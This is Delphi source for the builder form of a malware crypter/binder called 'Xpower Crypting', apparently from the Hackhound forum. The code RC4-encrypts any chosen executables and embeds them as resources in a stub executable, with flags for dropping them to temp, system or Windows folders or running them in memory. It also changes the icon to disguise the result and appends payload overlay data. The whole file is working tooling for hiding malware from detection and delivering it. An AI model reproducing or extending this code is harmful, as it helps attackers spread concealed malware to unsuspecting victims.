unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Buttons , Xpman ,uRC4, ShellApi , jpeg, IconChangerUnit, WinSkinData;

type
  TForm1 = class(TForm)
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    SpeedButton4: TSpeedButton;
    CheckBox1: TCheckBox;
    Label1: TLabel;
    Shape1: TShape;
    SpeedButton5: TSpeedButton;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    Edit1: TEdit;
    SpeedButton6: TSpeedButton;
    Label2: TLabel;
    SkinData1: TSkinData;
    SpeedButton7: TSpeedButton;
    Image1: TImage;
    CheckBox2: TCheckBox;
    Label3: TLabel;
    CheckBox3: TCheckBox;
    Label4: TLabel;
    Image2: TImage;
    Label5: TLabel;
    Label6: TLabel;
    CheckBox4: TCheckBox;
    Label7: TLabel;
    CheckBox5: TCheckBox;
    Label8: TLabel;
    CheckBox6: TCheckBox;
    Label9: TLabel;
    CheckBox7: TCheckBox;
    Label10: TLabel;
    CheckBox8: TCheckBox;
    Label11: TLabel;
    CheckBox9: TCheckBox;
    Label12: TLabel;
    procedure Image1Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton5Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure SpeedButton6Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton4Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure SpeedButton7Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

uses Unit2, Unit3, Unit4, Unit5, Unit6;

{$R *.dfm}

Function ReadTheFile(FileName: String): AnsiString;
Var
  F             :File;
  Buffer        :AnsiString;
  Size          :Integer;
  ReadBytes     :Integer;
  DefaultFileMode:Byte;
Begin
  Result := '';

  DefaultFileMode := FileMode;

  FileMode := 0;
  AssignFile(F, FileName);
  Reset(F, 1);

  If (IOResult = 0) Then
  Begin
    Size := FileSize(F);

    While (Size > 1024) Do
    Begin
      SetLength(Buffer, 1024);
      BlockRead(F, Buffer[1], 1024, ReadBytes);
      Result := Result + Buffer;
      Dec(Size, ReadBytes);
    End;

    SetLength(Buffer, Size);
    BlockRead(F, Buffer[1], Size);
    Result := Result + Buffer;

    CloseFile(F);
  End;

  FileMode := DefaultFileMode;
End;

function GetSettingsData(FileName: String; var lpData: Pointer; var dwSettingsLen: DWORD): Boolean;
var
  hFile: THandle;
  DosHeader: TImageDosHeader;
  NtHeaders: TImageNtHeaders;
  SectionHeader: TImageSectionHeader;
  dwReadBytes, dwOrginalFileSize, dwFileSize, dwSettingsLength: DWORD;
begin
  Result := False;
  hFile := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  ReadFile(hFile, DosHeader, sizeof(DosHeader), dwReadBytes, nil);
  if dwReadBytes = sizeof(DosHeader) then
  begin
    SetFilePointer(hFile, DosHeader._lfanew, nil, FILE_BEGIN);
    ReadFile(hFile, NtHeaders, sizeof(NtHeaders), dwReadBytes, nil);
    if dwReadBytes = sizeof(NtHeaders) then
    begin
      SetFilePointer(hFile, sizeof(SectionHeader) * (NtHeaders.FileHeader.NumberOfSections -1), nil, FILE_CURRENT);
      ReadFile(hFile, SectionHeader, sizeof(SectionHeader), dwReadBytes, nil);
      dwOrginalFileSize := SectionHeader.PointerToRawData + SectionHeader.SizeOfRawData;
      dwFileSize := GetFileSize(hFile, nil);
      dwSettingsLength := dwFileSize - dwOrginalFileSize;
      if dwSettingsLength > 0 then
      begin
        SetFilePointer(hFile, dwOrginalFileSize, nil, FILE_BEGIN);
        GetMem(lpData, dwSettingsLength);
        ReadFile(hFile, lpData^, dwSettingsLength, dwReadBytes, nil);
        if dwReadBytes = dwSettingsLength then
        begin
          Result := True;
          dwSettingsLen := dwSettingsLength;
          CloseHandle(hFile);
        end else
          CloseHandle(hFile);
      end else
        CloseHandle(hFile);
    end else
      CloseHandle(hFile);
  end else
    CloseHandle(hFile);
end;

Procedure WriteResData(ServerFile: String; Buffer: Pointer; Size: Integer; ResourceName: String);
Var
  ResourceHandle        :THandle;
  WideServerFile        :PWideChar;
  WideResourceName      :PWideChar;
Begin
  GetMem(WideServerFile,   (Length(ServerFile)   + 1) * 2);
  GetMem(WideResourceName, (Length(ResourceName) + 1) * 2);

  Try
    StringToWideChar(ServerFile,   WideServerFile,   Length(ServerFile)   * 2);
    StringToWideChar(ResourceName, WideResourceName, Length(ResourceName) * 2);

    ResourceHandle := BeginUpdateResourceW(WideServerFile, False);
    UpdateResourceW(ResourceHandle, MakeIntResourceW(10), WideResourceName, 0, Buffer, Size);
    EndUpdateResourceW(ResourceHandle, False);
  Except
    FreeMem(WideServerFile);
    FreeMem(WideResourceName);
  End;
End;

procedure TForm1.Image1Click(Sender: TObject);
begin
 OpenDialog1.Filter := 'Icon Files |*.ico';
 OpenDialog1.Title  := ' Select Icon File ';
 if OpenDialog1.Execute Then
    begin
    Image1.Picture.LoadFromFile(Opendialog1.FileName);
    end;
end;

procedure TForm1.SpeedButton1Click(Sender: TObject);
begin
 Form2.Show;
end;

Function CurrentFolder:String ;   // Retrive current folder as STRING
var
i,Ri:integer;
begin
 For i:=0 To length(Paramstr(0)) do
      begin
      Ri:=Length(Paramstr(0))-i;
      if ParamStr(0)[Ri]='\' Then
      begin
      Result:=Copy(Paramstr(0),0,Ri);
      Break;
      end;
      end;
end;
                  //yea that is main shity part of the builder
Procedure Do_The_Shit(stubPath,Path,ResourceName:String; Kind:Integer);
Var
buffer:Ansistring;
i:integer;
begin
Buffer:=ReadTheFile(Path);   // Read our file to string
For i:=0 To 512 do
 begin
 Buffer:=Rc4(Buffer,Form1.Edit1.Text);   // Encrypt it with uRc4
 end;
 if Kind=0 Then ResourceName:='T'+ResourceName;  // if temp [T]
 if Kind=1 Then ResourceName:='S'+ResourceName;  // if SYSTEM ]S]
 if Kind=2 Then ResourceName:='W'+ResourceName;   // IF windows [W]
 if Kind=3 Then ResourceName:='M'+ResourceName;   // IF Memorey
WriteResData(stubPath,@buffer[1],Length(buffer),ResourceName); // Write Our File to stub AS REsource
end;

procedure TForm1.SpeedButton5Click(Sender: TObject);
var
Buffer:AnsiString;// Store our Files(Read)
Stubpath,CheckStubPath:String;// path to our stub
hFile: THandle;
dwSettingsLength, dwBytesWritten: DWORD;
lpData: Pointer;
begin
 CheckStubPath:=CurrentFolder+'Stub.exe';  // PATH TO our stub file (my stub lol)
 if not Fileexists(CheckStubPath) Then
 begin
 Messagebox(0,'ChainStub.exe Is Missing Or Courrpted ','Fatal Error',16);
 exit;   // check if my stub file exists if not show error message
 end;

 Savedialog1.Filter:='Executable Images |*.exe';
 Savedialog1.Title:='Protected File';
 if Savedialog1.Execute Then
 begin
  stubpath:=Savedialog1.FileName;
  if pos('.exe',Stubpath)=0 Then Stubpath:=Stubpath+'.exe';

  CopyFile(Pchar(CheckStubPath),Pchar(StubPath),False);//copying my stub xd

  if Form2.Edit1.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit1.Text,'1',0);
  if Form2.Edit2.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit2.Text,'2',0);
  if Form2.Edit3.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit3.Text,'3',0);
  if Form2.Edit4.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit4.Text,'4',0);
  if Form2.Edit5.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit5.Text,'5',0);
  if Form2.Edit6.Text <>'' Then  Do_The_Shit(stubpath,Form2.Edit6.Text,'6',0);

  if Form3.Edit1.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit1.Text,'1',1);
  if Form3.Edit2.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit1.Text,'2',1);
  if Form3.Edit3.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit3.Text,'3',1);
  if Form3.Edit4.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit4.Text,'4',1);
  if Form3.Edit5.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit5.Text,'5',1);
  if Form3.Edit6.Text <>'' Then  Do_The_Shit(stubpath,Form3.Edit6.Text,'6',1);

  if Form4.Edit1.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit1.Text,'1',2);
  if Form4.Edit2.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit2.Text,'2',2);
  if Form4.Edit3.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit3.Text,'3',2);
  if Form4.Edit4.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit4.Text,'4',2);
  if Form4.Edit5.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit5.Text,'5',2);
  if Form4.Edit6.Text <>'' Then  Do_The_Shit(stubpath,Form4.Edit6.Text,'6',2);

  if Form5.Edit1.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit1.Text,'1',3);
  if Form5.Edit2.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit2.Text,'2',3);
  if Form5.Edit3.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit3.Text,'3',3);
  if Form5.Edit4.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit4.Text,'4',3);
  if Form5.Edit5.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit5.Text,'5',3);
  if Form5.Edit6.Text <>'' Then  Do_The_Shit(stubpath,Form5.Edit6.Text,'6',3);

  // Yeah looks noobish but it is simple way for noobs other's can use loops and shits
  buffer:=Edit1.Text;
 // buffer:=Rc4(edit1.Text,'Chaincoder');//encrypting the random encryption key it self   if u want
  WriteResData(stubPath,@buffer[1],Length(buffer),'KEY');

  if Checkbox1.Checked then
  begin
  image1.Picture.SaveToFile(CurrentFolder+'icon.ico'); //saving icon to file
  ChangeExeIcon(StubPath,'MAINICON',CurrentFolder+'icon.ico');               //Changing icon file
  DeleteFile(CurrentFolder+'icon.ico');                // delete saved icon
  end;

    if GetSettingsData(Form5.Edit1.Text, lpData, dwSettingsLength) then
  begin
    hFile :=  CreateFile(pchar(StubPath),GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    SetFilePointer(hFile,0,nil,FILE_END);
    WriteFile(hFile, lpData^, dwSettingsLength, dwBytesWritten, nil);
    CloseHandle(hFile);
    FreeMem(lpData, dwSettingsLength);
  end;


 Messagebox(0,'Your package is ready with sucessfull !','Xpower Crypting',Mb_iconInformation);
 end;

end;

procedure TForm1.SpeedButton3Click(Sender: TObject);
begin
 Form4.Show;
end;

procedure TForm1.SpeedButton6Click(Sender: TObject);
var
S:String;
i,iloop:integer;
begin
edit1.Text:='';
  S:='QWERTYUIOPASDFGHJKLZXCVBNM123456789qwertyuasdfghjklzxcvbnm';
  For i:=0 To 10 do // 10 digits encryption key
       begin
       Randomize;
       iloop:=Random(length(s));
       Edit1.Text:=Edit1.Text+S[ILOOP];
       end;
end;

procedure TForm1.SpeedButton2Click(Sender: TObject);
begin
    form3.Show;
end;

procedure TForm1.SpeedButton4Click(Sender: TObject);
begin
  Form5.Show;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 Speedbutton6.Click;
//Messagebox(0,'This Release is Brought to you by Hackhound.Org | ChainCoder','About This Software',MB_ICONINFORMATION);
end;

procedure TForm1.SpeedButton7Click(Sender: TObject);
begin
 Form6.show;
end;

end.
